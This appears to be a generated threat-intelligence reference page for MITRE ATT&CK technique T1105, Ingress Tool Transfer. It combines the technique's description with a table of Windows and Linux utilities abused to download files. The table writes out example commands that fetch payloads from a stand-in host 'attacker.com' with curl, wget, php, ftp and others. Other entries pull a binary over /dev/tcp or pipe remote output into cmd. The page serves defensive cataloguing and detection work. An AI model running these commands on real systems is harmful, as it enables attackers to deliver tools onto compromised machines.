---
parsed_by: focuslocust
source: mitre
type: generated
---
# T1105 - Ingress Tool Transfer

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `mitre` |
| Type | `technique` |
| Record ID | `T1105` |
| Source file | `` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). 

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).

Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).

Files can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.

## Related Tools

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [AppInstaller.exe](../../tools/windows/appinstaller.exe.md) | explicit | source | Command metadata lists T1105: start ms-appinstaller://?source={REMOTEURL:.exe} |
| [AsyncRAT](../../tools/unknown/asyncrat.md) | explicit | source | [AsyncRAT](https://attack.mitre.org/software/S1087) has the ability to download files including over SFTP.(Citation: AsyncRAT GitHub)(Citation: ESET MirrorFace 2025) |
| [BITSAdmin](../../tools/unknown/bitsadmin.md) | explicit | source | [BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload and/or download files.(Citation: Microsoft BITSAdmin) |
| [Bcp.exe](../../tools/windows/bcp.exe.md) | explicit | source | Command metadata lists T1105: bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c |
| [Bitsadmin.exe](../../tools/windows/bitsadmin.exe.md) | explicit | source | Command metadata lists T1105: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset |
| [Brute Ratel C4](../../tools/unknown/brute-ratel-c4.md) | explicit | source | <br>[Brute Ratel C4](https://attack.mitre.org/software/S1063) can download files to compromised hosts.(Citation: Palo Alto Brute Ratel July 2022)(Citation: Rapid7 Fake W2 July 2024) |
| [CARROTBALL](../../tools/unknown/carrotball.md) | explicit | source | [CARROTBALL](https://attack.mitre.org/software/S0465) has the ability to download and install a remote payload.(Citation: Unit 42 CARROTBAT January 2020) |
| [CSPY Downloader](../../tools/unknown/cspy-downloader.md) | explicit | source | [CSPY Downloader](https://attack.mitre.org/software/S0527) can download additional tools to a compromised host.(Citation: Cybereason Kimsuky November 2020) |
| [CertOC.exe](../../tools/windows/certoc.exe.md) | explicit | source | Command metadata lists T1105: certoc.exe -GetCACAPS {REMOTEURL:.ps1} |
| [CertReq.exe](../../tools/windows/certreq.exe.md) | explicit | source | Command metadata lists T1105: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} |
| [Certutil.exe](../../tools/windows/certutil.exe.md) | explicit | source | Command metadata lists T1105: certutil.exe -URL {REMOTEURL:.exe} |
| [Cmd.exe](../../tools/windows/cmd.exe.md) | explicit | source | Command metadata lists T1105: type {PATH_SMB} > {PATH_ABSOLUTE} |
| [ConfigSecurityPolicy.exe](../../tools/windows/configsecuritypolicy.exe.md) | explicit | source | Command metadata lists T1105: ConfigSecurityPolicy.exe {REMOTEURL} |
| [Desktopimgdownldr.exe](../../tools/windows/desktopimgdownldr.exe.md) | explicit | source | Command metadata lists T1105: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr |
| [Diantz.exe](../../tools/windows/diantz.exe.md) | explicit | source | Command metadata lists T1105: diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab} |
| [Donut](../../tools/unknown/donut.md) | explicit | source | [Donut](https://attack.mitre.org/software/S0695) can download and execute previously staged shellcode payloads.(Citation: Donut Github) |
| [ECMangen.exe](../../tools/windows/ecmangen.exe.md) | explicit | source | Command metadata lists T1105: ECMangen.exe {REMOTEURL} |
| [Empire](../../tools/unknown/empire.md) | explicit | source | [Empire](https://attack.mitre.org/software/S0363) can upload and download to and from a victim machine.(Citation: Github PowerShell Empire) |
| [Esentutl.exe](../../tools/windows/esentutl.exe.md) | explicit | source | Command metadata lists T1105: esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o |
| [Excel.exe](../../tools/windows/excel.exe.md) | explicit | source | Command metadata lists T1105: Excel.exe {REMOTEURL} |
| [Expand.exe](../../tools/windows/expand.exe.md) | explicit | source | Command metadata lists T1105: expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext} |
| [Extrac32.exe](../../tools/windows/extrac32.exe.md) | explicit | source | Command metadata lists T1105: extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe} |
| [Findstr.exe](../../tools/windows/findstr.exe.md) | explicit | source | Command metadata lists T1105: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe} |
| [Finger.exe](../../tools/windows/finger.exe.md) | explicit | source | Command metadata lists T1105: finger user@example.host.com \| more +2 \| cmd |
| [Ftp.exe](../../tools/windows/ftp.exe.md) | explicit | source | Command metadata lists T1105: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.tx... |
| [GfxDownloadWrapper.exe](../../tools/windows/gfxdownloadwrapper.exe.md) | explicit | source | Command metadata lists T1105: C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE" |
| [Hh.exe](../../tools/windows/hh.exe.md) | explicit | source | Command metadata lists T1105: HH.exe {REMOTEURL:.bat} |
| [IMEWDBLD.exe](../../tools/windows/imewdbld.exe.md) | explicit | source | Command metadata lists T1105: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL} |
| [Ieexec.exe](../../tools/windows/ieexec.exe.md) | explicit | source | Command metadata lists T1105: ieexec.exe {REMOTEURL:.exe} |
| [Installutil.exe](../../tools/windows/installutil.exe.md) | explicit | source | Command metadata lists T1105: InstallUtil.exe {REMOTEURL} |
| [Koadic](../../tools/unknown/koadic.md) | explicit | source | [Koadic](https://attack.mitre.org/software/S0250) can download additional files and tools.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) |
| [Ldifde.exe](../../tools/windows/ldifde.exe.md) | explicit | source | Command metadata lists T1105: Ldifde -i -f {PATH:.ldf} |
| [MCMD](../../tools/unknown/mcmd.md) | explicit | source | [MCMD](https://attack.mitre.org/software/S0500) can upload additional files to a compromised host.(Citation: Secureworks MCMD July 2019) |
| [MSAccess.exe](../../tools/windows/msaccess.exe.md) | explicit | source | Command metadata lists T1105: MSAccess.exe {REMOTEURL} |
| [Makecab.exe](../../tools/windows/makecab.exe.md) | explicit | source | Command metadata lists T1105: makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab} |
| [MpCmdRun.exe](../../tools/windows/mpcmdrun.exe.md) | explicit | source | Command metadata lists T1105: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platfor... |
| [Msdeploy.exe](../../tools/windows/msdeploy.exe.md) | explicit | source | Command metadata lists T1105: msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext} |
| [Msedge.exe](../../tools/windows/msedge.exe.md) | explicit | source | Command metadata lists T1105: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64} |
| [Mshta.exe](../../tools/windows/mshta.exe.md) | explicit | source | Command metadata lists T1105: mshta.exe {REMOTEURL} |
| [MsoHtmEd.exe](../../tools/windows/msohtmed.exe.md) | explicit | source | Command metadata lists T1105: MsoHtmEd.exe {REMOTEURL} |
| [Mspub.exe](../../tools/windows/mspub.exe.md) | explicit | source | Command metadata lists T1105: mspub.exe {REMOTEURL} |
| [Ngen.exe](../../tools/windows/ngen.exe.md) | explicit | source | Command metadata lists T1105: ngen.exe {REMOTEURL} |
| [OneDriveStandaloneUpdater.exe](../../tools/windows/onedrivestandaloneupdater.exe.md) | explicit | source | Command metadata lists T1105: OneDriveStandaloneUpdater |
| [PhotoViewer.dll](../../tools/windows/photoviewer.dll.md) | explicit | source | Command metadata lists T1105: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL} |
| [Powerpnt.exe](../../tools/windows/powerpnt.exe.md) | explicit | source | Command metadata lists T1105: Powerpnt.exe {REMOTEURL} |
| [Presentationhost.exe](../../tools/windows/presentationhost.exe.md) | explicit | source | Command metadata lists T1105: Presentationhost.exe {REMOTEURL} |
| [Print.exe](../../tools/windows/print.exe.md) | explicit | source | Command metadata lists T1105: print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe} |
| [PrintBrm.exe](../../tools/windows/printbrm.exe.md) | explicit | source | Command metadata lists T1105: PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip} |
| [ProtocolHandler.exe](../../tools/windows/protocolhandler.exe.md) | explicit | source | Command metadata lists T1105: ProtocolHandler.exe {REMOTEURL} |
| [Pupy](../../tools/unknown/pupy.md) | explicit | source | [Pupy](https://attack.mitre.org/software/S0192) can upload and download to/from a victim machine.(Citation: GitHub Pupy) |
| [QuasarRAT](../../tools/unknown/quasarrat.md) | explicit | source | [QuasarRAT](https://attack.mitre.org/software/S0262) can download files to the victim’s machine and execute them.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) |
| [Remcos](../../tools/unknown/remcos.md) | explicit | source | [Remcos](https://attack.mitre.org/software/S0332) can upload and download files to and from the victim’s machine.(Citation: Riskiq Remcos Jan 2018)(Citation: Fortinet Remcos Campaign NOV 2024) |
| [RemoteUtilities](../../tools/unknown/remoteutilities.md) | explicit | source | [RemoteUtilities](https://attack.mitre.org/software/S0592) can upload and download files to and from a target machine.(Citation: Trend Micro Muddy Water March 2021) |
| [Replace.exe](../../tools/windows/replace.exe.md) | explicit | source | Command metadata lists T1105: replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A |
| [SILENTTRINITY](../../tools/unknown/silenttrinity.md) | explicit | source | [SILENTTRINITY](https://attack.mitre.org/software/S0692) can load additional files and tools, including [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub SILENTTRINITY Modules July 2019) |
| [Scrobj.dll](../../tools/windows/scrobj.dll.md) | explicit | source | Command metadata lists T1105: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe} |
| [ShimRatReporter](../../tools/unknown/shimratreporter.md) | explicit | source | [ShimRatReporter](https://attack.mitre.org/software/S0445) had the ability to download additional payloads.(Citation: FOX-IT May 2016 Mofang) |
| [Shimgvw.dll](../../tools/windows/shimgvw.dll.md) | explicit | source | Command metadata lists T1105: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe} |
| [Sliver](../../tools/unknown/sliver.md) | explicit | source | [Sliver](https://attack.mitre.org/software/S0633) can download additional content and files from the [Sliver](https://attack.mitre.org/software/S0633) server to the client residing on the victim machine using the <code>upload</code> command.(Citation: GitHub Sliver Upload)(Citation: Cybereason Sliver Undated) |
| [Tar.exe](../../tools/windows/tar.exe.md) | explicit | source | Command metadata lists T1105: tar -xf {PATH_SMB:.tar} |
| [VSLaunchBrowser.exe](../../tools/windows/vslaunchbrowser.exe.md) | explicit | source | Command metadata lists T1105: VSLaunchBrowser.exe .exe {REMOTEURL:.exe} |
| [Visio.exe](../../tools/windows/visio.exe.md) | explicit | source | Command metadata lists T1105: Visio.exe {REMOTEURL} |
| [WinProj.exe](../../tools/windows/winproj.exe.md) | explicit | source | Command metadata lists T1105: WinProj.exe {REMOTEURL} |
| [Winword.exe](../../tools/windows/winword.exe.md) | explicit | source | Command metadata lists T1105: winword.exe {REMOTEURL} |
| [Wmic.exe](../../tools/windows/wmic.exe.md) | explicit | source | Command metadata lists T1105: wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe" |
| [Wsl.exe](../../tools/windows/wsl.exe.md) | explicit | source | Command metadata lists T1105: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary' |
| [Xwizard.exe](../../tools/windows/xwizard.exe.md) | explicit | source | Command metadata lists T1105: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL} |
| [ab](../../tools/linux/ab.md) | inferred | high | Command appears to retrieve a remote file: ab -v2 http://attacker.com/path/to/input-file |
| [aria2c](../../tools/linux/aria2c.md) | inferred | high | Command appears to retrieve a remote file: echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain |
| [certutil](../../tools/unknown/certutil.md) | explicit | source | [certutil](https://attack.mitre.org/software/S0160) can be used to download files from a given URL.(Citation: TechNet Certutil)(Citation: LOLBAS Certutil) |
| [cmd](../../tools/unknown/cmd.md) | explicit | source | [cmd](https://attack.mitre.org/software/S0106) can be used to copy files to/from a remotely connected external system.(Citation: TechNet Copy) |
| [cmdl32.exe](../../tools/windows/cmdl32.exe.md) | explicit | source | Command metadata lists T1105: cmdl32 /vpn /lan %cd%\config |
| [curl](../../tools/linux/curl.md) | inferred | high | Command appears to retrieve a remote file: curl http://attacker.com/path/to/input-file -o /path/to/output-file |
| [devtunnel.exe](../../tools/windows/devtunnel.exe.md) | explicit | source | Command metadata lists T1105: devtunnel.exe host -p 8080 |
| [dtutil.exe](../../tools/windows/dtutil.exe.md) | explicit | source | Command metadata lists T1105: dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext} |
| [esentutl](../../tools/unknown/esentutl.md) | explicit | source | [esentutl](https://attack.mitre.org/software/S0404) can be used to copy files from a given URL.(Citation: LOLBAS Esentutl) |
| [ftp](../../tools/unknown/ftp.md) | explicit | source | [ftp](https://attack.mitre.org/software/S0095) may be abused by adversaries to transfer tools or files from an external system into a compromised environment.(Citation: Microsoft FTP)(Citation: Linux FTP) |
| [jjs](../../tools/linux/jjs.md) | inferred | high | Command appears to retrieve a remote file: jjs var URL = Java.type('java.net.URL'); var ws = new URL('http://attacker.com/path/to/input-file'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.n... |
| [jrunscript](../../tools/linux/jrunscript.md) | inferred | high | Command appears to retrieve a remote file: jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")' |
| [julia](../../tools/linux/julia.md) | inferred | high | Command appears to retrieve a remote file: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")' |
| [kubectl](../../tools/linux/kubectl.md) | inferred | high | Command appears to retrieve a remote file: cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users: - name: x user: exec: apiV... |
| [lwp-download](../../tools/linux/lwp-download.md) | inferred | high | Command appears to retrieve a remote file: lwp-download http://attacker.com/path/to/input-file /path/to/output-file |
| [msedge_proxy.exe](../../tools/windows/msedge-proxy.exe.md) | explicit | source | Command metadata lists T1105: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip} |
| [msxsl.exe](../../tools/windows/msxsl.exe.md) | explicit | source | Command metadata lists T1105: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH} |
| [node](../../tools/linux/node.md) | inferred | high | Command appears to retrieve a remote file: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))' |
| [php](../../tools/linux/php.md) | inferred | high | Command appears to retrieve a remote file: php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);' |
| [python](../../tools/linux/python.md) | inferred | high | Command appears to retrieve a remote file: python -c 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve("http://attacker.com/path/to... |
| [restic](../../tools/linux/restic.md) | inferred | high | Command appears to retrieve a remote file: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file |
| [ruby](../../tools/linux/ruby.md) | inferred | high | Command appears to retrieve a remote file: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")' |
| [wget](../../tools/linux/wget.md) | inferred | high | Command appears to retrieve a remote file: wget http://attacker.com/path/to/input-file -O /path/to/output-file |
| [winget.exe](../../tools/windows/winget.exe.md) | explicit | source | Command metadata lists T1105: winget.exe install --accept-package-agreements -s msstore {name or ID} |
| [winrm.vbs](../../tools/windows/winrm.vbs.md) | inferred | high | Command appears to retrieve a remote file: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985 |
| [xsd.exe](../../tools/windows/xsd.exe.md) | explicit | source | Command metadata lists T1105: xsd.exe {REMOTEURL} |
| [yt-dlp](../../tools/linux/yt-dlp.md) | inferred | high | Command appears to retrieve a remote file: yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #' |
| [yum](../../tools/linux/yum.md) | inferred | high | Command appears to retrieve a remote file: yum install http://attacker.com/path/to/input-file.rpm |

## Source Verification

[source record](../../sources/mitre/ingress-tool-transfer.md)

## Evidence Excerpt

```text
created: '2017-05-31T21:31:16.408Z'
created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
description: "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools\
\ or files may be copied from an external adversary-controlled system to the victim network through the command and control\
\ channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries\
\ may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).\
\ \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160),\
\ and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code>\
```
